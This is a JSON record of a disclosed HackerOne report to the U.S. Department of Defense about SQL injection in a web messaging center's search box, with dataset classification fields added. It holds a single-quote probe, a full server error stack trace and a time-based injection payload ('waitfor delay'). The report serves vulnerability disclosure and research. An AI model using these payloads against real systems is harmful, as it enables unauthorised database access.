{
  "reported_to": "U.S. Dept Of Defense",
  "reported_by": "modam3r5 ",
  "title": "sql injection on  /messagecenter/messagingcenter at https://www.\u2588\u2588\u2588\u2588\u2588\u2588\u2588/",
  "content": "\nHi ,\ni would like to report an issues that lead to SQL injection in search box at https://www.\u2588\u2588\u2588\u2588/messagecenter/messagingcenter , if you add the character ' that usually used to test if the site have in sql injection the site will return with Incorrect syntax error that can confirm the site is effected with this bug .\nPOC\nopen the following link and enter ' in the box will see this error in response https://www.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/messagecenter/messagingcenter\nCode 4.00 KiB\n1Server Error in '/' Application.\n2Unclosed quotation mark after the character string ' ORDER BY StartDate2 DESC'.\n3Incorrect syntax near ' ORDER BY StartDate2 DESC'.\n4Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code.\n5\n6Exception Details: System.Data.SqlClient.SqlException: Unclosed quotation mark after the character string ' ORDER BY StartDate2 DESC'.\n7Incorrect syntax near ' ORDER BY StartDate2 DESC'.\n8\n9Source Error:\n10\n11An unhandled exception was generated during the execution of the current web request. Information regarding the origin and location of the exception can be identified using the exception stack trace below.\n12\n13Stack Trace:\n14\n15\n16[SqlException (0x80131904): Unclosed quotation mark after the character string ' ORDER BY StartDate2 DESC'.\n17Incorrect syntax near ' ORDER BY StartDate2 DESC'.]\n18   System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection, Action`1 wrapCloseInAction) +1787822\n19   System.Data.SqlClient.SqlInternalConnection.OnError(SqlException exception, Boolean breakConnection, Action`1 wrapCloseInAction) +5341894\n20   System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning(TdsParserStateObject stateObj, Boolean callerHasConnectionLock, Boolean asyncClose) +546\n21   System.Data.SqlClient.TdsParser.TryRun(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj, Boolean& dataReady) +1693\n22   System.Data.SqlClient.SqlDataReader.TryConsumeMetaData() +61\n23   System.Data.SqlClient.SqlDataReader.get_MetaData() +90\n24   System.Data.SqlClient.SqlCommand.FinishExecuteReader(SqlDataReader ds, RunBehavior runBehavior, String resetOptionsString) +377\n25   System.Data.SqlClient.SqlCommand.RunExecuteReaderTds(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, Boolean async, Int32 timeout, Task& task, Boolean asyncWrite, SqlDataReader ds) +1421\n26   System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method, TaskCompletionSource`1 completion, Int32 timeout, Task& task, Boolean asyncWrite) +177\n27   System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method) +53\n28   System.Data.SqlClient.SqlCommand.ExecuteReader(CommandBehavior behavior, String method) +137\n29   System.Data.SqlClient.SqlCommand.ExecuteDbDataReader(CommandBehavior behavior) +41\n30   System.Data.Common.DbCommand.System.Data.IDbCommand.ExecuteReader(CommandBehavior behavior) +10\n31   System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) +140\n32   System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) +316\n33   System.Data.Common.DbDataAdapter.Fill(DataSet dataSet) +88\n34   GCSS_Army.MessageCenter.MessagingCenter.getMessages(String ssql) in C:\\Users\\\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\\source\\repos\\New GCSS-Army\\WebApplication4\\WebApplication4\\MessageCenter\\MessagingCenter.aspx.cs:171\n35   GCSS_Army.MessageCenter.MessagingCenter.btnSearch_Click(Object sender, EventArgs e) in C:\\Users\\\u2588\u2588\u2588\u2588\\source\\repos\\New GCSS-Army\\WebApplication4\\WebApplication4\\MessageCenter\\MessagingCenter.aspx.cs:275\n36   System.Web.UI.WebControls.Button.OnClick(EventArgs e) +9663950\n37   System.Web.UI.WebControls.Button.RaisePostBackEvent(String eventArgument) +103\n38   System.Web.UI.WebControls.Button.System.Web.UI.IPostBackEventHandler.RaisePostBackEvent(String eventArgument) +10\n39   System.Web.UI.Page.RaisePostBackEvent(IPostBackEventHandler sourceControl, String eventArgument) +13\n40   System.Web.UI.Page.RaisePostBackEvent(NameValueCollection postData) +35\n41   System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint) +1724\n42\nyou can used this command 1'; waitfor delay '0:0:2' -- and the error page will return after 2 second\nImpact\nAn attacker may execute arbitrary SQL statements on the vulnerable system. This may compromise the integrity of your database and/or expose sensitive information.\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "SQL Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1570574820,
  "report_url": "https://hackerone.com/reports/381758",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Navigate to https://www.\u2588\u2588\u2588\u2588/messagecenter/messagingcenter"
    ],
    [
      2,
      "Enter a single quote (') in the search box and observe the SQL syntax error in the response"
    ]
  ],
  "vuln_description": "The vulnerability is a SQL injection in the search box of the messaging center. By injecting a single quote ('), the application returns a SQL syntax error, confirming the vulnerability. An attacker can exploit this to execute arbitrary SQL commands, potentially compromising the database integrity or exposing sensitive information.",
  "reason": "The vulnerability is straightforward to discover as it only requires testing with a single quote (') in the search box, a common SQL injection test. The error message directly confirms the vulnerability, making it easy to identify without complex interactions or multiple components.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": true
  },
  "authnz_metadata": {
    "reason": "The SQL injection vulnerability is detected through input manipulation (adding a single quote) in the search box, which triggers a database syntax error. This falls outside the scope of the proposed AuthN/AuthZ and IDOR detection methodologies, as it involves direct input validation and SQL query manipulation rather than session or resource ID swapping.",
    "is_detectable": false
  }
}